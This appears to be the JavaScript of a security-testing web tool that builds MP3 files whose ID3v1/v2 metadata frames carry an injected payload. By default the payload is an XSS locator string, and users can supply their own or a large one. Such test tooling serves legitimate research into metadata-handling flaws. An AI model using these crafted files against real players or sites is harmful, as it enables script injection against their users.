$("document").ready(function () {
    function getFile() {
        //get clean mp3 w/o metadata
        $("#v1_download_button").button("loading");
        $("#v2_download_button").button("loading");

        var xhr = new XMLHttpRequest();
        xhr.open("GET", "/audio/noot_no_ID3.mp3", true);
        xhr.responseType = "blob"; // response is binary data

        xhr.onerror = function () { // workaround if used locally because chrome forbids access to local files
            $("#v1LocalFileModal").modal({backdrop: "static", keyboard: false});
            //rest gets called by changing file input in modal
        };

        xhr.onload = function () {
            if (this.status == 200) {
                window.mp3blob = this.response;
                $("#v1_download_button").button("reset");
                $("#v2_download_button").button("reset");

            } else console.log("hm. http status: " + this.status);

        };
        xhr.send();
    }

    getFile();

    $("#v1LocalFile").on("change", function (event) { // workaround if used locally because chrome forbids access to local files
        window.mp3blob = event.target.files[0];

        $("#v1LocalFileModal").modal("hide");
        $("#v1_download_button").button("reset");
        $("#v2_download_button").button("reset");

    });


    $("#v1Button").click(function () {
        $(this).addClass("active");
        $("#v2Button").removeClass("active");

        $("#id3v2form").collapse("hide");
        $("#id3v1form").collapse("show");
        $("#choosePrompt").collapse("hide");
    });
    $("#v2Button").click(function () {
        $(this).addClass("active");
        $("#v1Button").removeClass("active");

        $("#id3v1form").collapse("hide");
        $("#id3v2form").collapse("show");
        $("#choosePrompt").collapse("hide");
    });
    var $v1checkboxlabels = $("#v1checkboxes").find("label");
    $("#v1checkAllButton").click(function () {
        $v1checkboxlabels.not("#v1year").addClass("active");
    });

    $("#v1checkNoneButton").click(function () {
        $v1checkboxlabels.removeClass("active");
    });
    $("#v1year").click(function () {
        $("#v1year").addClass("active");//workaround to make it not-selectable
    });
    $("[data-toggle='popover']").popover();//register popovers

    var $v2selectoptions = $("#v2select").find("option");
    $("#v2checkAllButton").click(function () {
        $v2selectoptions.prop("selected", true);
    });

    $("#v2checkNoneButton").click(function () {
        $v2selectoptions.prop("selected", false);
    });

    var bigPayload = "";

    $("#pastePayload").click(function () {
        if (bigPayload === "") {
            jQuery.get("/audio/bigPayload.txt", function (response) {
                bigPayload = response;
                $("#v2payload").val(bigPayload);
            }, "text").fail(function () {
                $("#localtxtModal").modal();
            });
        } else $("#v2payload").val(bigPayload);
    });

    $("#localtxt").on("change", function (event) {
        var reader = new FileReader();
        reader.onload = function (e) {
            bigPayload = reader.result;
            $("#pastePayload").click();
        };
        reader.readAsText(event.target.files[0]);
        $("#localtxtModal").modal("hide");
    });


    function getBytes(str) {
        var hexArray = [];
        for (var index in str) {
            hexArray[index] = str.charCodeAt(index);
        }
        return hexArray;
    }


    $("#v1_download_button").click(function () {
        //Get inputs, build the file, save it
        var $btn = $(this).button("loading");
        var frameDict = [];
        var v1_boxes = $("#v1checkboxes").find(".active input");

        for (var index in v1_boxes) {
            frameDict[v1_boxes[index].value] = true;
        }

        var payloadHex = [27, 0x27, 0x3b, 0x21, 0x2d, 0x2d, 0x22, 0x3c, 0x58, 0x53, 0x53, 0x3e, 0x3d, 0x26, 0x7b, 0x28, 0x29, 0x7d]; //short xss locator

        var v1pl_string = $("#v1payload").val();

        if (v1pl_string !== "") {
            payloadHex = getBytes(v1pl_string);
        }

        download_v1(frameDict, payloadHex);
        setTimeout(function () {
            $btn.button("reset");
        }, 1000); //idk, loading time feels more intuitive
    });

    function download_v1(frameDict, payloadHexArray) {

        var a = window.document.createElement("a");

        a.href = window.URL.createObjectURL(new Blob([mp3blob, build_v1_Array(frameDict, payloadHexArray)], {type: "application/octet-stream"}));
        a.download = "noot_injected_id3v1.mp3";

        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);

    }

    function build_v1_Array(frameDict, payloadArray) {

        var v1_buffer = new ArrayBuffer(128);
        var v1_viewer = new Uint8Array(v1_buffer);

        v1_viewer[0] = 0x54;//T
        v1_viewer[1] = 0x41;//A
        v1_viewer[2] = 0x47;//G
        v1_viewer[127] = 0xff;

        function v1_setBytes(startbyte, hexArray) {
            for (var i = 0; i < hexArray.length; i++) {
                v1_viewer[startbyte + i] = hexArray[i];
            }
        }

        if (frameDict["title"]) v1_setBytes(3, payloadArray);
        else v1_setBytes(3, getBytes("noot noot(metal edit)"));

        if (frameDict["artist"]) v1_setBytes(33, payloadArray);
        else v1_setBytes(33, getBytes("Pingu"));

        if (frameDict["album"]) v1_setBytes(63, payloadArray);
        else v1_setBytes(63, getBytes("Pingus Greatest Hits"));

        v1_setBytes(93, getBytes("1942"));

        if (frameDict["comment"]) v1_setBytes(97, payloadArray);
        else v1_setBytes(97, getBytes("derctwr.de/metattacker"));

        return v1_viewer;
    }


    $("#v2_download_button").click(function () {
        //Get inputs, build the file, save it
        var $btn = $(this).button("loading");
        var frameList = $("#v2select").val(); //could be none

        var payloadHexArray = [27, 0x27, 0x3b, 0x21, 0x2d, 0x2d, 0x22, 0x3c, 0x58, 0x53, 0x53, 0x3e, 0x3d, 0x26, 0x7b, 0x28, 0x29, 0x7d]; //short xss locator

        var v2pl_string = $("#v2payload").val();

        if (typeof(v2pl_string) != "undefined") {
            var max_tag_size = (0xfffffff - 10); //up to 256mbit
            if (v2pl_string.length > max_tag_size) {
                alert("your payload is too big! Current Payload: " + v2pl_string.length + "allowed Payload: " + max_tag_size + "\n lighten your payload");
                return;
            } else if (v2pl_string !== "") {
                payloadHexArray = getBytes(v2pl_string);
            }
        }

        download_v2(frameList, payloadHexArray);
        setTimeout(function () {
            $btn.button("reset");
        }, 1000); //idk, loading time feels more intuitive
    });

    function download_v2(frameList, payloadHexArray) {
        var theArray = build_v2_Array(frameList, payloadHexArray);

        if (theArray) { //if it"s not false(too big)
            var a = window.document.createElement("a");
            a.href = window.URL.createObjectURL(new Blob([theArray, mp3blob], {type: "application/octet-stream"}));
            a.download = "noot_injected_id3v2.mp3";

            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }

    }

    function build_v2_Array(frameList, rawPayloadValArray) {

        var tag = [];
        //var tag= new Uint8Array(buffer);

        tag[0] = 0x49;//I
        tag[1] = 0x44;//D
        tag[2] = 0x33;//3
        tag[3] = 0x03;//version byte

        var currentByte = 10;//"pointer" to current end of tag

        function setFrame(id, content) {
            var frameHeader = createFrameHeader(id, [0, 0], content.length);
            v2_setBytes(currentByte, frameHeader.concat(content));
            currentByte += 10 + content.length;
        }

        function createFrameHeader(id, flagArray, size) {
            var sizeBytes = [0, 0, 0, 0];
            var flagBytes = [];
            flagBytes[0] = flagArray[0];
            flagBytes[1] = flagArray[1];
            if (size > 0xffffffff) {
                alert("The " + id + " field is too big! It will probably be read incorrectly.");
            }
            var sizeString = (size).toString(16);
            sizeBytes[3] = parseInt(sizeString.slice(-2), 16);//size
            sizeBytes[2] = parseInt(sizeString.slice(-4, -2), 16);//size COULD BE none
            sizeBytes[1] = parseInt(sizeString.slice(-6, -4), 16);//size COULD BE none
            sizeBytes[0] = parseInt(sizeString.slice(0, -6), 16);//size COULD BE none
            var frameHeader = getBytes(id).concat(sizeBytes, flagBytes);
            return frameHeader;
        }

        function v2_setBytes(startbyte, valArray) {
            //sets bytes of the tag to those of a given array.
            for (var i = 0; i < valArray.length; i++) {
                tag[startbyte + i] = valArray[i];
            }
        }

        var pictureData = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44,
            0x52, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x20, 0x08, 0x06, 0x00, 0x00, 0x00, 0x73, 0x7a, 0x7a, 0xf4,
            0x00, 0x00, 0x00, 0x01, 0x73, 0x52, 0x47, 0x42, 0x00, 0xae, 0xce, 0x1c, 0xe9, 0x00, 0x00, 0x00, 0x04, 0x67,
            0x41, 0x4d, 0x41, 0x00, 0x00, 0xb1, 0x8f, 0x0b, 0xfc, 0x61, 0x05, 0x00, 0x00, 0x00, 0x09, 0x70, 0x48, 0x59,
            0x73, 0x00, 0x00, 0x0e, 0xc4, 0x00, 0x00, 0x0e, 0xc4, 0x01, 0x95, 0x2b, 0x0e, 0x1b, 0x00, 0x00, 0x01, 0x39,
            0x49, 0x44, 0x41, 0x54, 0x58, 0x47, 0xed, 0x96, 0x3b, 0x12, 0x83, 0x20, 0x14, 0x45, 0x29, 0x53, 0xa6, 0x4c,
            0x69, 0x6b, 0xe9, 0x12, 0xd2, 0xa6, 0x74, 0x19, 0xb6, 0x59, 0x86, 0x6d, 0x4a, 0x97, 0xe0, 0x36, 0x52, 0xba,
            0x95, 0x6c, 0x81, 0x70, 0x5e, 0x42, 0x06, 0x19, 0x34, 0x01, 0x99, 0xb1, 0x08, 0x77, 0xe6, 0x0e, 0x23, 0x28,
            0xef, 0xf0, 0xf8, 0xa9, 0xf4, 0xce, 0x2a, 0x00, 0x05, 0xa0, 0x00, 0x6c, 0x06, 0x98, 0xa6, 0x49, 0xf7, 0xb7,
            0x5e, 0x5f, 0xda, 0x8b, 0xae, 0x9b, 0x66, 0xe6, 0xee, 0xda, 0x49, 0xfb, 0x9a, 0x36, 0x01, 0x10, 0xa0, 0xae,
            0x8e, 0x5f, 0x0d, 0xdc, 0x12, 0x48, 0x12, 0xc0, 0x38, 0x8e, 0xaf, 0x51, 0x06, 0x82, 0xad, 0x99, 0x4c, 0xf9,
            0x8a, 0x06, 0xa0, 0x93, 0x50, 0xe7, 0xbf, 0x9a, 0x6c, 0xb8, 0x8a, 0x02, 0x90, 0x91, 0x07, 0x3a, 0x8d, 0xb5,
            0x9b, 0x09, 0xc5, 0xdc, 0xc8, 0x02, 0x32, 0x0d, 0x6b, 0x8b, 0x86, 0xfa, 0x94, 0xb4, 0x2f, 0x99, 0xc1, 0x20,
            0x45, 0xf0, 0xee, 0x74, 0xd0, 0xf7, 0xe6, 0x24, 0x0d, 0x3c, 0xd3, 0xe8, 0x83, 0x58, 0xc8, 0xb6, 0x3d, 0x9b,
            0xb6, 0xfb, 0xcf, 0x0b, 0x70, 0xd1, 0x66, 0x30, 0x48, 0xf1, 0x40, 0xf0, 0xc7, 0xb9, 0x92, 0x12, 0x18, 0xff,
            0x45, 0x77, 0xe4, 0x04, 0x57, 0x4a, 0x49, 0x09, 0xcc, 0xec, 0xdd, 0x48, 0x33, 0x15, 0x02, 0x40, 0x70, 0xd7,
            0x80, 0x0c, 0xa6, 0x1e, 0x18, 0x6b, 0xfb, 0xd1, 0x30, 0x0c, 0x12, 0x18, 0x88, 0xad, 0x00, 0x64, 0x35, 0x08,
            0xe0, 0xdb, 0x4e, 0x0f, 0xb6, 0x00, 0x39, 0x32, 0x40, 0x66, 0xa3, 0x01, 0xb2, 0x05, 0xc7, 0x29, 0x00, 0x59,
            0xbd, 0x37, 0xc0, 0x67, 0x0d, 0x10, 0xc0, 0x0d, 0x66, 0x17, 0xa0, 0xff, 0x41, 0x6e, 0xcb, 0x2e, 0xf0, 0xcf,
            0x01, 0xd2, 0x22, 0x75, 0x66, 0x9f, 0xbb, 0xe7, 0xc1, 0xe6, 0x7d, 0xef, 0xdb, 0xc4, 0x41, 0xb3, 0x93, 0x90,
            0x72, 0xe9, 0x24, 0x44, 0xb9, 0x20, 0x88, 0x63, 0x15, 0x7d, 0x19, 0xa5, 0xde, 0x84, 0xd6, 0x0c, 0xc2, 0x55,
            0xf2, 0xff, 0x00, 0x20, 0x92, 0xb9, 0x6f, 0x30, 0xef, 0x29, 0x0d, 0x5d, 0xc5, 0x28, 0x19, 0x20, 0x97, 0x0a,
            0x40, 0x01, 0xf8, 0x77, 0x00, 0xad, 0x9f, 0x51, 0xd8, 0xf3, 0xe0, 0x30, 0x62, 0x3e, 0x4f, 0x00, 0x00, 0x00,
            0x00, 0x49, 0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82]; //466Byte png imgae data; 32x32px

        for (var index in frameList) {

            var id = frameList[index];
            var payload = getBytes(id).concat(rawPayloadValArray);
            var content = "";

            switch (id.charAt(0)) { //decide frame body with switch on first letter (T, W, etc) vorher special ifs (TXXX,COMM etc)
                case "T":
                    if (id == "TOPE") {
                        content = [0].concat(getBytes("purple-planet.com "), payload);
                    }
                case "W":
                    if (id == "TXXX" || id == "WXXX") {
                        content = [0].concat(payload, 0, payload);
                        break;
                    }
                case "I":
                    //Normal Text Frames
                    content = [0].concat(payload);
                    break;
                case "U":
                    if (id == "USER") {
                        content = [0].concat(getBytes("eng"), 0, payload, 0, payload);
                        break;
                    }
                    //unsyncedLyrics
                    content = [0].concat(getBytes("eng"), payload, 0, payload);// maybe one nullbyte missing?
                    break;
                case "S":
                    //syncedlyrics
                    content = [0].concat(getBytes("eng"), 2, 1, payload, 0, payload, 0, 0, 1000);
                    break;
                case "C":
                    if (id == "COMR") {
                        content = [0].concat(payload, 0, getBytes("20420420"), payload, 0, 3, payload, 0, payload, 0, getBytes("image/png"), 0, pictureData);
                        break;
                    }
                    //comment
                    content = [0].concat(getBytes("eng"), 0, payload, 0, payload);
                    break;
                case "A":
                    if (id == "AENC") { //audio encryption info
                        content = payload.concat(0, 0, 42, 42, 0, payload);
                        break;
                    }
                    //picture
                    content = [0].concat(getBytes("image/png"), 0, 3, payload, 0, pictureData);
                    break;
                case "P":
                    if (id == "PRIV") {
                        content = payload.concat(0, payload);
                    }
                    //popularity meter
                    content = payload.concat(0, 42, 42);
                    break;
                case "O":
                    //ownership frame
                    content = [0].concat(payload, 0, getBytes("19960420"), payload);
                    break;
                case "E": //Encryption method registration
                case "G":
                    //Group identification
                    content = payload.concat(0, 42, payload);
                    break;
            }
            setFrame(id, content);


        }

        var size = currentByte - 10; //tag header is not counted
        if (size > 0xfffffff) { //as if...
            alert("Your payload is too big! Use a lighter one or select less frames." +
                "\n Allowed size: " + 0xfffffff + "\n Your size: " + size);
            return false;
        }
        //converting size to base 2^7
        var size_str = size.toString(2);

        tag[6] = parseInt(size_str.slice(0, -21), 2);//size
        tag[7] = parseInt(size_str.slice(-21, -14), 2);//size
        tag[8] = parseInt(size_str.slice(-14, -7), 2);//size
        tag[9] = parseInt(size_str.slice(-7), 2);//size

        return Uint8Array.from(tag);

    }

});